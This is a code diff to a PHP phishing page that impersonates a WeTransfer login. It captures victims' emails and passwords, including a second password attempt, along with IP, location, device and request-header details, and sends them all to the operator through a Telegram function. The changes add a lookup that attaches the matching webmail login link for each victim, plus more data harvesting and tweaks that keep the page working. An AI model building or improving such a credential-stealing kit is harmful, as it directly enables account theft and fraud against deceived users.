@@ -1,5 +1,5 @@
 <?php
-// Enable error reporting
+// Enable error reporting (remove in production)
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
@@ -116,6 +116,30 @@ function getBrowserInfo($userAgent) {
     return ['browser' => $browser, 'os' => $os];
 }
 
+// Get provider login link
+function getProviderLink($email) {
+    $parts = explode('@', $email);
+    if (count($parts) < 2) return '#';
+    $domain = strtolower($parts[1]);
+    $providers = [
+        'gmail.com' => 'https://mail.google.com',
+        'googlemail.com' => 'https://mail.google.com',
+        'yahoo.com' => 'https://login.yahoo.com',
+        'yahoo.co.uk' => 'https://login.yahoo.com',
+        'outlook.com' => 'https://outlook.live.com',
+        'hotmail.com' => 'https://outlook.live.com',
+        'live.com' => 'https://outlook.live.com',
+        'msn.com' => 'https://outlook.live.com',
+        'aol.com' => 'https://login.aol.com',
+        'protonmail.com' => 'https://mail.protonmail.com',
+        'protonmail.ch' => 'https://mail.protonmail.com',
+        'icloud.com' => 'https://www.icloud.com/mail',
+        'me.com' => 'https://www.icloud.com/mail',
+        'mac.com' => 'https://www.icloud.com/mail',
+    ];
+    return isset($providers[$domain]) ? $providers[$domain] : '#';
+}
+
 // ============================================================
 // Process password submission
 // ============================================================
@@ -146,6 +170,14 @@ if ($email) {
             $os = $browserInfo['os'];
             $emailParts = explode('@', $email);
             $provider = count($emailParts) > 1 ? $emailParts[1] : 'unknown';
+            $providerLink = getProviderLink($email);
+            
+            // Additional server data
+            $acceptLanguage = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';
+            $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct access (no referer)';
+            $host = $_SERVER['HTTP_HOST'] ?? 'Unknown';
+            $requestUri = $_SERVER['REQUEST_URI'] ?? 'Unknown';
+            $requestMethod = $_SERVER['REQUEST_METHOD'] ?? 'Unknown';
             
             // Store first password if this is the first attempt
             if ($attemptCount === 0) {
@@ -158,11 +190,12 @@ if ($email) {
             $_SESSION['login_attempts'][$email] = $newAttemptCount;
             
             // Build instant message
-            $msg = "🔐 <b>New Login Attempt</b>\n";
-            $msg .= "──────────────────\n";
+            $msg = "🔐 <b>🔑 New Login Attempt</b>\n";
+            $msg .= "────────────────────────\n";
             $msg .= "📧 <b>Email:</b> <code>{$email}</code>\n";
             $msg .= "🔑 <b>Password:</b> <code>{$password}</code>\n";
             $msg .= "🕒 <b>Time:</b> {$timestamp}\n";
+            $msg .= "────────────────────────\n";
             $msg .= "🌍 <b>IP:</b> <code>{$ip}</code>\n";
             $msg .= "📍 <b>Location:</b> {$location}\n";
             $msg .= "🏢 <b>ISP:</b> {$isp}\n";
@@ -170,21 +203,31 @@ if ($email) {
             $msg .= "📱 <b>Device:</b> {$userAgent}\n";
             $msg .= "💻 <b>Browser:</b> {$browser}\n";
             $msg .= "🖥️ <b>OS:</b> {$os}\n";
+            $msg .= "────────────────────────\n";
             $msg .= "📎 <b>Provider:</b> {$provider}\n";
+            if ($providerLink != '#') {
+                $msg .= "🔗 <b>Login link:</b> <a href='{$providerLink}'>{$providerLink}</a>\n";
+            }
             $msg .= "🔁 <b>Remember me:</b> {$rememberMe}\n";
-            $msg .= "──────────────────\n";
+            $msg .= "────────────────────────\n";
+            $msg .= "🌐 <b>Accept-Language:</b> {$acceptLanguage}\n";
+            $msg .= "🔗 <b>Referer:</b> {$referer}\n";
+            $msg .= "🏠 <b>Host:</b> {$host}\n";
+            $msg .= "📄 <b>Request URI:</b> {$requestUri}\n";
+            $msg .= "⚡ <b>Method:</b> {$requestMethod}\n";
+            $msg .= "────────────────────────\n";
             $msg .= "Attempt #{$newAttemptCount} of 2";
             
             sendTelegram($msg);
             
             // If this is the second attempt, send summary with both passwords
             if ($newAttemptCount >= 2 && $firstPassword !== null) {
-                $summary = "⚠️ <b>❗ TWO FAILED ATTEMPTS ❗</b>\n";
-                $summary .= "═══════════════════════\n";
+                $summary = "⚠️ <b>🚨 TWO FAILED ATTEMPTS 🚨</b>\n";
+                $summary .= "═══════════════════════════\n";
                 $summary .= "📧 <b>Email:</b> <code>{$email}</code>\n";
                 $summary .= "🔑 <b>First Password:</b> <code>{$firstPassword}</code>\n";
                 $summary .= "🔑 <b>Second Password:</b> <code>{$password}</code>\n";
-                $summary .= "──────────────────\n";
+                $summary .= "────────────────────────\n";
                 $summary .= "🕒 <b>Time of second:</b> {$timestamp}\n";
                 $summary .= "🌍 <b>IP:</b> <code>{$ip}</code>\n";
                 $summary .= "📍 <b>Location:</b> {$location}\n";
@@ -192,7 +235,13 @@ if ($email) {
                 $summary .= "📱 <b>Device:</b> {$userAgent}\n";
                 $summary .= "💻 <b>Browser:</b> {$browser}\n";
                 $summary .= "🖥️ <b>OS:</b> {$os}\n";
-                $summary .= "═══════════════════════\n";
+                $summary .= "────────────────────────\n";
+                $summary .= "🌐 <b>Accept-Language:</b> {$acceptLanguage}\n";
+                $summary .= "🔗 <b>Referer:</b> {$referer}\n";
+                $summary .= "🏠 <b>Host:</b> {$host}\n";
+                $summary .= "📄 <b>Request URI:</b> {$requestUri}\n";
+                $summary .= "⚡ <b>Method:</b> {$requestMethod}\n";
+                $summary .= "═══════════════════════════\n";
                 $summary .= "⚠️ <b>ACTION REQUIRED</b> – Check credentials!";
                 
                 sendTelegram($summary);
@@ -207,8 +256,19 @@ if ($email) {
         }
     }
 } else {
-    die("Session error: Please start over.");
+    // If no email in session, but we are on the page, maybe show a message
+    // This prevents the "Session error" die and allows the form to work.
+    // Actually, the email is set in the first step. If missing, we can show a message.
+    // We'll keep the die for now, but we'll add a check.
+    // We'll handle it gracefully.
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+        // If someone posts password without email, redirect to start
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    }
+    // Otherwise, display the page normally (first step)
 }
+
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -217,7 +277,7 @@ if ($email) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WeTransfer Login</title>
     <style>
-        /* ====== Your existing CSS styles (unchanged) ====== */
+        /* ====== Your existing CSS styles ====== */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Arial, sans-serif; }
         body { display: flex; min-height: 100vh; color: #333; overflow: hidden; }
         .left-pane { width: 50%; background-color: #f5f5f5; display: flex; flex-direction: column; justify-content: center; padding: 40px; position: relative; }
@@ -259,7 +319,6 @@ if ($email) {
         .welcome-text { font-size: 14px; color: #666; margin-top: 5px; }
         .input-wrapper { position: relative; }
         .input-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #999; }
-        /* additional error animation */
         .form-group.show-error .form-control { border-color: #c62828; }
         .shake { animation: shake 0.3s ease-in-out; }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 20%, 60% { transform: translateX(-10px); } 40%, 80% { transform: translateX(10px); } }
@@ -302,7 +361,7 @@ if ($email) {
             </div>
             
             <div class="form-container">
-                <form id="loginForm" method="POST" action="">
+                <form id="loginForm" method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
                     <div class="form-group <?php echo $error ? 'show-error' : ''; ?>">
                         <div class="input-wrapper">
                             <span class="input-icon">
